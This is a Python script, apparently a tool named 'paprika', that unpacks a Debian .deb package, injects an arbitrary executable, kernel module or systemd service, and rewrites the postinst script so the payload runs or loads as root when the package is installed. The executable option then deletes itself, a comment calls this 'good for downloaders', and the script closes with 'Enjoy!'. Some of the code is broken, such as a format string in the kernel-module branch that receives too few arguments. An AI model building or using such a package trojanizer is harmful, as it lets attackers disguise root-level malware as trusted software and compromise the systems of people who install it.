#!/bin/python3
# paprika.py
# https://github.com/R-Rothrock/paprika

from contextlib import suppress
from datetime import datetime
from os import chdir, getcwd, makedirs, mkdir, system, walk
from os.path import basename
import sys
from uuid import uuid4

#%% Getting things ready

DEBUG = True

MIN_ARGC = 3
MAX_ARGC = 3

if len(sys.argv) < MIN_ARGC or len(sys.argv) > MAX_ARGC:
    print("USAGE: %s [EXECUTABLE] [.DEB FILE]" % (sys.argv[0]))
    sys.exit()

#%% File Handling System

class DebHandler:
    def __init__(self):
        random_str = uuid4().hex.upper()[0:10]
        self.wdir = "/tmp/paprika_" + random_str
    
    def unzip(self) -> tuple:
        """
        Returns path to `preinst`, path to `postinst`, and the
        path to `data`.
        """
        mkdir(self.wdir)

        # copying
        system("cp %s %s" % (sys.argv[2], self.wdir))
        deb_file = sys.argv[2].split("/")[-1]
            
        prev_dir = getcwd()
        chdir(self.wdir)

        # unzipping .deb
        system("ar -x %s" % (deb_file))
           
        # unzipping `control.tar.gz`
        system("gzip -d control.tar.gz")
            
        # unzipping `data.(tar|tar.gz|tar.bzip|tar.lzma)`
        # by method of reading file extention

        files = []
        for (dirpath, dirnames, filenames) in walk(self.wdir):
            files.extend(filenames)
            break

        ext = ""
        for file in files:
            if file.startswith("data.tar"):
                ext = file.replace("data.tar", "", 1)
                break

        match ext:
            case "":
                pass # nothing to be done
            case ".gz":
                system("gzip -d data.tar.gz")
            case ".bz2":
                system("bzip2 -d data.tar.bz2")
            case ".lzma":
                system("unlzma data.tar.lzma")

        mkdir("control")
        mkdir("data")
        system("tar -xf control.tar --directory control")
        system("tar -xf data.tar --directory data")
        
        # deleting old files
        system("rm control.tar data.tar *.deb")

        chdir(prev_dir)
        
        yield self.wdir + "/control/preinst"
        yield self.wdir + "/control/postinst"
        yield self.wdir + "/data"

    def rezip(self) -> str:
        """
        returns path to new `.deb` file
        """
        prev_dir = getcwd()
        chdir(self.wdir)

        # tar
        system("tar -c control -f control.tar")
        system("tar -c data -f data.tar")
        system("rm -rf control data")

        # gzip
        system("gzip control.tar")
        system("gzip data.tar")

        # ar
        system("ar -r %s/new.deb debian-binary control.tar.gz data.tar.gz" % (self.wdir))

        return self.wdir + "/new.deb"

#%% Logging System

class Logger:
    def __init__(self, stream=sys.stdout, debug=True):
        self.stream = stream

        self.debug_messages = debug

        self.blue   = "\033[34m"
        self.cyan   = "\033[36m"
        self.green  = "\033[32m"
        self.red    = "\033[31m"
        self.yellow = "\033[33m"
        self.reset  = "\033[39m"

    def __get_time(self) -> str:
        now = datetime.now()
        return now.strftime("%H:%M:%S")

    def __get_time_field(self) -> str:
        return "[%s%s%s]" % (self.blue, self.__get_time(), self.reset)

    def debug(self, msg):
        if not self.debug_messages:
            return
        print("%s[%sDEBUG%s]:\t%s" % (
            self.__get_time_field(), self.cyan, self.reset, msg
        ))

    def info(self, msg):
        print("%s[%sINFO%s]:\t%s"% (
            self.__get_time_field(), self.green, self.reset, msg
        ))

    def warning(self, msg):
        print("%s[%sWARNING%s]:\t%s" % (
            self.__get_time_field(), self.yellow, self.reset, msg
        ))
    
    def critical(self, msg):
        print("%s[%sCRITICAL%s]:\t%s" % (
            self.__get_time_field(), self.red, self.reset, msg
        ))

    def error(self, msg):
        print("%s[%sERROR%s]:\t%s" % (
            self.__get_time_field(), self.red, self.reset, msg
        ))

# test
#if __name__ == "__main__":
#    l = Logger()
#    l.debug("Debugging message")
#    l.info("Informational message")
#    l.warning("Warning message")
#    l.critical("Critical message")
#    l.error("Segmentation Fault")

h = DebHandler()
l = Logger(debug=DEBUG)

#%% argument handling (among other things)
l.debug("Parsing arguments...")

# confirming that files exists
try:
    with open(sys.argv[1], "r") as stream:
        pass
except FileNotFoundError:
    l.error("File `%s` doesn't exist. Exiting..." % (sys.argv[1]))
    sys.exit(-1)
try:
    with open(sys.argv[2], "r") as stream:
        pass
except FileNotFoundError:
    l.error("File `%s` doesn't exist. Exiting..." % (sys.argv[2]))
    sys.exit(-1)

# recognizing file type of fist argument

if sys.argv[1].endswith(".ko"):
    # option 2
    # loading a kernel module.
    def ins_data(data_path, postinst_path):
        mkdir("%s/lib/modules/" % (data_path))
        system("cp %s %s/lib/modules" % (sys.argv[1], data_path))
        with open(postinst_path, "a") as stream:
            # since we don't know what kernel we'll be running, this
            # is the best I can come up with to load the module.
            # janky as best, but if you have a (reasonably acheivable)
            # better idea, start a pr :)
            stream.write(
                "\nmv /lib/modules/%s /lib/modules/$(uname -r)/extra\n"
                "modprobe /lib/modules/$(uname -r)/extra/%s\n"
                % (basename(sys.argv[1]))
            )

elif sys.argv[1].endswith(".service"):
    # option 3
    # enabling and starting a service file.
    def ins_data(data_path, postinst_path):
        mkdir("%s/etc/systemd/user" % (data_path))
        system("cp %s %s/etc/systemd/user" % (sys.argv[1], data_path))
        with open(postinst_path, "a") as stream:
            stream.write(
                "\nsystemctl enable /etc/systemd/user/%s\n" % (sys.argv[1])
                + "systemctl start /etc/systemd/user/%s" % (sys.argv[1])
            )

else:
    # option 1
    # running a regular old program as root
    # deletes the program after execution is complete
    # good for downloaders
    def ins_data(data_path, postinst_path):
        makedirs("%s/tmp/apt" % (data_path))
        system("cp %s %s/tmp/apt" % (sys.argv[1], data_path))
        with open(postinst_path, "a") as stream:
            stream.write(
                "\n/tmp/apt/*\n"
                + "rm -rf /tmp/apt"
            )

l.info("Starting execution")

l.info("Unzipping file...")

preinst, postinst, data = h.unzip()

l.info("inserting new data")
ins_data(data, postinst)

l.info("Rezipping file...")
new_file = h.rezip()

l.debug("Original new file is at %s" % (new_file))
system("mv %s ." % (new_file))
l.info("New file is located at './%s'." % (basename(new_file)))

l.warning("Enjoy!")

